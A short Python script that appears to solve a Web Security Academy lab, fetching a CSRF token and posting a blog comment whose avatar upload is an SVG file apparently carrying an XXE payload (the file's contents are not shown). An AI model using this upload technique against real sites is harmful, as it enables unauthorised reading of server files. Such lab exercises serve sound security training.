import requests
from bs4 import BeautifulSoup
s = requests.Session()

site = 'acbb1f271eed210c807222a400ef00a9.web-security-academy.net'

post_url = f'https://{site}/post?postId=5'
resp = s.get(post_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

comment_url = f'https://{site}/post/comment'

multipart_form_data = {
    'csrf' : (None, csrf),
    'postId' : (None, '5'),
    'comment' : (None, 'Nice blog.  Be a shame if anything happened to it.'),
    'name' : (None, 'Chance'),
    'email' : (None, 'spurgeonc@sou.edu'),
    'website': (None, 'https://sou.edu'),
    'avatar' : ('avatar.svg', open('xxe4-2.svg', 'rb'))
}

resp = s.post(comment_url, files=multipart_form_data)